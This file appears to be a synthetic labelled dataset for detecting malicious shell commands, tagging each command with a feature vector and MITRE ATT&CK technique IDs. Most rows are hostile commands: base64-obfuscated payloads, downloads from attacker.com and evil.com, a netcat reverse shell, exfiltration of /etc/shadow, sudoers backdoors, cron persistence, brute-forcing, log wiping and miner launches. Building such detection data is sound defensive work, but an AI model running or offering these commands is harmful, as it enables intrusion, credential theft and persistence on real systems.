"bash -c ""find / -name 'id_rsa' 2>/dev/null""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.28, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'KGNyb250YWIgLWw7IGVjaG8gJyogKiAqICogKiAvdG1wL3BheWxvYWQuc2gnKSB8IGNyb250YWIgLQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cnVudXNlciAtbCBwb3N0Z3JlcyAtYyAncHNxbCAtYyAiU0VMRUNUIHBnX3JlYWRfZmlsZShcJy9ldGMvcGFzc3dkXCcpIicgJiYgPiAvZGV2L251bGwgMj4mMQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
unset HISTFILE; export HISTSIZE=0,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time id,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
"sudo runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'","[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo -e '\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
for p in $(cat passwords.txt); do sshpass -p $p ssh root@10.0.0.1 id; done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.52, 0, 0]",['T1110_Brute_Force'],synthetic
last -n 10,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1033_System_Owner_Discovery'],synthetic
sudo echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers | history -c,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
nohup mkdir -p /opt/myapp &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
w ; > /dev/null 2>&1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.2, 1, 0]","['T1033_System_Owner_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
New-ItemProperty -Path 'HKLM:\...' -Name Persist -Value 'C:\payload.exe',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1112_Modify_Registry'],synthetic
sudo wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
wget http://attacker.com/payload -O /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
"bash -c ""echo 'Zm9yIHAgaW4gJChjYXQgcGFzc3dvcmRzLnR4dCk7IGRvIHNzaHBhc3MgLXAgJHAgc3NoIHJvb3RAMTAuMC4wLjEgaWQ7IGRvbmU=' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1110_Brute_Force', 'T1027_Obfuscated_Files_or_Information']",synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
cat /etc/resolv.conf ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup ls -la /root /etc /var/www &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1083_File_and_Directory_Discovery'],synthetic
net user /domain && chmod +x /tmp/payload,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 1]","['T1087_Account_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo dmidecode -t system | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo find / -name 'id_rsa' 2>/dev/null | chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
medusa -h 10.0.0.1 -u root -P /tmp/passwords.txt -M ssh && chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOy4uLic=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup sudo -u www-data bash ; echo done &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1078_Valid_Accounts', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo curl -s http://c2.attacker.com/beacon,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1041_Exfiltration_Over_C2_Channel'],synthetic
echo 'cGFzc3dkIC1kIHJvb3Q=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
"nmap  -sV  -p  22,80,443  10.0.0.0/24","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.2, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
time net user /add attacker P@ssw0rd && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.36, 1, 0]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'aGlzdG9yeSAtYyAmJiBoaXN0b3J5IC13' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
route -n && echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo nmcli connection show,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
"bash -c ""wmiexec.py domain/admin:pass@10.0.0.5 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
hostnamectl | echo done,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1098_Account_Manipulation'],synthetic
pwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['BENIGN'],synthetic
sudo wmic useraccount list,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1087_Account_Discovery'],synthetic
masscan -p1-65535 10.0.0.0/24 --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
echo  'JGVudjpjbWQgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVbmljb2RlLkdldFN0cmluZyhbU3lzdGVtLkNvbnZlcnRdOjpGcm9tQmFzZTY0U3RyaW5nKCdkd0JvQUc4QVlRQnRBR2tBJykp'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""cp /etc/hosts /tmp/hosts.bak""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
echo  'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4gfCBlY2hvIGRvbmU='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
./dirtycow /etc/passwd 'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
./dirtycow  /etc/passwd  'root::0:0:root:/root:/bin/bash',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nmcli connection show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
time echo 'Y2F0IC9ldGMvc2hhZG93IHwgbmMgMTAuMC4wLjk5IDQ0NDQ=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1041_Exfiltration_Over_C2_Channel', 'T1027_Obfuscated_Files_or_Information']",synthetic
time hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1110_Brute_Force'],synthetic
find  /  -name  '*.conf'  -readable  2>/dev/null  |  head  -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.36, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
nmap --script=vuln 10.0.0.1 | echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.2, 0.24, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo sudo -u www-data bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
sudo nmap --script=vuln 10.0.0.1,"[1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
nmcli  connection  show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
reg delete HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Defender | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'ZmluZCAvIC1uYW1lICcqLmNvbmYnIC1yZWFkYWJsZSAyPi9kZXYvbnVsbCB8IGhlYWQgLTIw' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo echo 'ZG1lc2cgfCBoZWFkIC0yMA==' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nohup route -n &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
curl -sL http://evil.com/xmrig | bash,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['T1496_Resource_Hijacking'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1021_Remote_Services'],synthetic
"bash -c ""vim /etc/hosts""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nohup usermod -aG sudo compromised_user &,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1098_Account_Manipulation'],synthetic
echo '@reboot /tmp/.xmr/xmrig -o pool.minexmr.com' | crontab -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1496_Resource_Hijacking'],synthetic
echo 'ZG1lc2cgfCBoZWFkIC0yMA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1082_System_Information_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'dGZ0cCAtaSAxMC4wLjAuOTkgR0VUIHBheWxvYWQuZXhlIEM6XFdpbmRvd3NcVGVtcFxwYXlsb2FkLmV4ZSAmJiBzbGVlcCAx' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
du -sh /var/log,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
./CVE-2021-4034,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
net localgroup administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
hostnamectl,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
echo 'Z2V0ZW50IHBhc3N3ZCB8IGdyZXAgLXYgbm9sb2dpbg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
tftp -i 10.0.0.99 GET payload.exe C:\Windows\Temp\payload.exe,"[1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo '*/5 * * * * curl http://c2.com/beacon' | crontab -,"[0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.44, 1, 0]",['T1053_Scheduled_Task'],synthetic
su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
nc -e /bin/bash attacker.com 80,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
powershell.exe -EncodedCommand JABzA...,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
nohup openssl rand -hex 16 &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['BENIGN'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
time df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
ssh -i ~/.ssh/stolen_key root@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
echo 'c3VkbyAtdSB3d3ctZGF0YSBiYXNo' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1078_Valid_Accounts', 'T1027_Obfuscated_Files_or_Information']",synthetic
"php -r '$sock=fsockopen(""10.0.0.99"",4444); ...'","[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
echo 'bG9jYXRlIHdwLWNvbmZpZy5waHA=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
masscan  -p1-65535  10.0.0.0/24  --rate=1000,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.16, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
(crontab  -l;  echo  '*  *  *  *  *  /tmp/payload.sh')  |  crontab  -,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]",['T1053_Scheduled_Task'],synthetic
cat  /etc/passwd  |  awk  -F:  '$3  >=  1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1087_Account_Discovery'],synthetic
gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.28, 0, 0]",['T1046_Network_Service_Scanning'],synthetic
useradd -m -s /bin/bash hacker,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo  'dW5zZXQgSElTVEZJTEU7IGV4cG9ydCBISVNUU0laRT0w'  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
sudo find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.44, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
time mkdir -p /opt/myapp,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
echo 'dW5zZXQgSElTVEZJTEU7IGV4cG9ydCBISVNUU0laRT0w' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['T1021_Remote_Services'],synthetic
at now + 1 minute <<< '/tmp/payload' | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup (crontab -l; echo '* * * * * /tmp/payload.sh') | crontab - &,"[0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.56, 1, 0]",['T1053_Scheduled_Task'],synthetic
nohup echo 'compromised ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers && chmod +x /tmp/payload &,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1098_Account_Manipulation', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c3NoIC1pIH4vLnNzaC9zdG9sZW5fa2V5IHJvb3RAMTAuMC4wLjU=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time rm -rf /tmp/* /var/tmp/*,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1070_Indicator_Removal'],synthetic
time wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; echo done,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo find /home -name '.env' 2>/dev/null ; echo done,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
psexec.py Administrator:password@10.0.0.5 cmd.exe | sleep 1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
find /var/log -name '*.log' -exec truncate -s 0 {} \;,"[0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1070_Indicator_Removal'],synthetic
